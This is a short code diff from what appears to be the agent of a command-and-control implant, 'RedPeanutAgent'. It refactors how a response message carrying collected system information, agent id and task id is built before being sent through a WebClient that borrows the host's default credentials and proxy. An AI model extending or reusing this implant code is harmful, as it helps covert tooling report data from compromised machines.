@@ -104,10 +104,15 @@ namespace RedPeanutAgent.Core
             wc.UseDefaultCredentials = true;
             wc.Proxy = WebRequest.DefaultWebProxy;
             wc.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;
-            ResponseMsg respmsg = new ResponseMsg();
+            ResponseMsg respmsg = new ResponseMsg
+            {
+                TaskInstanceid = taskinstance,
+                SystemInfo = GetSystemInfo(),
+                Chunked = false,
+                Agentid = agentid,
+                Number = 1
+            };
 
-            respmsg.SystemInfo = GetSystemInfo();
-            respmsg.Chunked = false;
             int chunksize = 1024000;
             //Response need to be splitted
             if (output.Length > chunksize)
